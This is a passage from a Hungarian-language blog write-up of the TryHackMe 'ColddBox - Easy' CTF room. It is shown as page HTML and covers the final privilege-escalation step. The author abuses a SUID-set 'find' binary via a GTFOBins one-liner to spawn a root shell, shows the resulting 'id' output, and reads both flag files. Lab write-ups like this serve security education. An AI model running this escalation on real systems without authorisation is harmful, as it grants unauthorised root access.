+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+www-data@ColddBox-Easy:/home/c0ldd$ 
+</code></pre><p>Kiderült, hogy a <code class="language-plaintext highlighter-rouge">find</code> programban van beállítva a suid bit, ellenőrizhetjük a gtfobins használatát</p><blockquote><p><a href="https://gtfobins.github.io/gtfobins/find/#suid"><code class="language-plaintext highlighter-rouge">GTFOBins</code></a></p></blockquote><p>Ezt a következőképp tudjuk kihasználni:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/usr/bin/find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="nt">-p</span> <span class="se">\;</span> <span class="nt">-quit</span>
+</pre></table></code></div></div><p>Eredmény:</p><pre><code class="language-report">www-data@ColddBox-Easy:/home$ /usr/bin/find . -exec /bin/sh -p \; -quit
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+# 
+</code></pre><p><code class="language-plaintext highlighter-rouge">Root</code>-ok vagyunk! Most már könnyedén kiírathatjuk mindkét flag-et!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">cat</span> /home/c0ldd/user.txt
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">cat</span> /root/root.txt
+</pre></table></code></div></div><h1 style="color: #e35757;"><b>PWNED.</b></h1><hr /><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>Tryhackme</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >Tryhackme</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/c0lddbox/" class="post-tag no-text-decoration" >C0lddBox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=ColddBox - Easy - Ther314m's Writeups&url=/posts/colddbox-easy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=ColddBox - Easy - Ther314m's Writeups&u=/posts/colddbox-easy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=ColddBox - Easy - Ther314m's Writeups&url=/posts/colddbox-easy/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/colddbox-easy/">ColddBox - Easy</a><li><a href="/posts/simple-ctf/">Simple CTF - Beginner level ctf</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/tryhackme/">Tryhackme</a> <a class="post-tag" href="/tags/c0lddbox/">C0lddBox</a> <a class="post-tag" href="/tags/simple-ctf/">Simple CTF</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/simple-ctf/"><div class="card-body"> <span class="timeago small" > Jul 15 <i class="unloaded">2021-07-15T03:45:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Simple CTF - Beginner level ctf</h3><div class="text-muted small"><p> Tryhackme room link: Simple CTF IP Hogy ne felejtsük el, exportáljuk a tryhackme-s IP-t az adott terminálba. export IP=10.10.231.115 ENUMERÁCIÓ Kezdjünk egy nmap-el, scanneljük le az első...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/simple-ctf/" class="btn btn-outline-primary" prompt="Older"><p>Simple CTF - Beginner level ctf</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/ther314m">ther314m</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/tryhackme/">Tryhackme</a> <a class="post-tag" href="/tags/c0lddbox/">C0lddBox</a> <a class="post-tag" href="/tags/simple-ctf/">Simple CTF</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
